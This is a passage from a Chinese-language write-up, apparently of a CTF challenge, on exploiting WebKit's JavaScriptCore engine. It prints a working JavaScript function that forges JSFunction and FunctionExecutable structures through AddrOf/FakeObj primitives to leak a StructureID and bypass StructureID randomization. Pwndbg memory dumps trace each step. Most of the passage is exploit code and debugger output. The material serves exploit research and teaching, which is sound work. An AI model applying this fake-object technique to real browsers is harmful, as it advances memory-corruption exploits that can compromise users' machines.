    pwndbg> x/10gx 0x00007fd3794aa6d4 // 执行函数名的指针
    0x7fd3794aa6d4:    0x0000004141414141    0x0000000200000000
                         // 函数名AAAAA
因此根据上述的寻址过程我们可以伪造上述 JSFunction
object、FunctionExecutable、UnlinkedFunctionExecutable、Identifier
String四个结构，最终Identifier String 的Pointer
指向structureID的地址，就可以将structureID当成函数名，以字符串的形式输出，达到泄露的目的。
伪造的寻址过程如下：
上图是将JSFunction object 和 Identifier String 蹂在一个结构里进行伪造了，泄露structureID代码如下：
    function LeakStructureID(obj)
    {
        // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
        var unlinkedFunctionExecutable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
        var fakeFunctionExecutable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinkedFunctionExecutable,
        };
        var container = {
          jscell: i2f(0x00001a0000000000),
          butterfly: {},
          pad: 0,
          m_functionExecutable: fakeFunctionExecutable,
        };
        let fakeObjAddr = AddrOf(container) + 0x10;
        let fakeObj = FakeObj(fakeObjAddr);
        unlinkedFunctionExecutable.m_identifier = fakeObj;
        container.butterfly = arrLeak; // 伪造Identifier String 的Pointer为泄露的目标对象arrLeak
        var nameStr = Function.prototype.toString.call(fakeObj);
        let structureID = nameStr.charCodeAt(9);
        // repair the fakeObj's jscell
        u32[0] = structureID;
        u32[1] = 0x01082309-0x20000;
        container.jscell = f64[0];
        return structureID;
    }
内存布局如下：
    // 要泄露的目标对象 arrLeak
    Object: 0x7f32c0569ae8 with butterfly 0x7f284cdd40a8 (Structure 0x7f32801f9800:[0xb0e4, Array, {}, ArrayWithDouble, Proto:0x7f32c05b70e8]), StructureID: 45284 
    //container 对象：    
    Object: 0x7f3280180000 with butterfly (nil) (Structure 0x7f32801bf540:[0x611b, Object, {jscell:0, butterfly:1, pad:2, m_functionExecutable:3}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 24859
    fakeObjAddr: 0x00007f3280180010
    // fakeFunctionExecutable 对象：
    Object: 0x7f3280184000 with butterfly (nil) (Structure 0x7f32801bf6c0:[0x2a4e, Object, {pad0:0, pad1:1, pad2:2, pad3:3, pad4:4, pad5:5, pad6:6, pad7:7, pad8:8, m_executable:9}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 10830
    // unlinkedFunctionExecutable 对象：
    Object: 0x7f3280188000 with butterfly (nil) (Structure 0x7f32801bfa80:[0x32be, Object, {m_isBuitinFunction:0, pad1:1, pad2:2, pad3:3, pad4:4, pad5:5, pad6:6, m_identifier:7}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 12990
    pwndbg> x/6gx 0x00007f3280180010  // fakeObj
    0x7f3280180010:    0x00021a0000000000    0x00007f32c0569ae8
    0x7f3280180020:    0xfffe000000000000    0x00007f3280184000  //  x/12gx 0x00007f3280184000
    0x7f3280184000:    0x0100180000002a4e    0x0000000000000000
    0x7f3280184010:    0xfffe000000000000    0xfffe000000000001
    0x7f3280184020:    0xfffe000000000002    0xfffe000000000003
    0x7f3280184030:    0xfffe000000000004    0xfffe000000000005
    0x7f3280184040:    0xfffe000000000006    0xfffe000000000007
    0x7f3280184050:    0xfffe000000000008    0x00007f3280188000 //  x/10gx 0x00007f3280188000
    0x7f3280188000:    0x01001800000032be    0x0000000000000000
    0x7f3280188010:    0x00020000deadbeef    0xfffe000000000001
    0x7f3280188020:    0xfffe000000000002    0xfffe000000000003
    0x7f3280188030:    0xfffe000000000004    0xfffe000000000005
    0x7f3280188040:    0xfffe000000000006    0x00007f3280180010 // unlinkedFunctionExecutable.m_identifier -> 覆盖成fakeObj;
    pwndbg> x/2gx 0x00007f3280180010
    0x7f3280180010:    0x00021a0000000000    0x00007f32c0569ae8// Pointer -> 覆盖成要泄露的目标对象arrLeak地址
                //        Flag| Length
    pwndbg> x/wx 0x00007f32c0569ae8
    0x7f32c0569ae8:    0x0000b0e4 // 
执行效果如下：
## 参考链接
题目环境下载：
基础知识及环境搭建：
gdb和lldb指令对比：
CVE-2016-4622调试笔记：
WEBKIT JAVASCRIPTCORE的特殊调试技巧：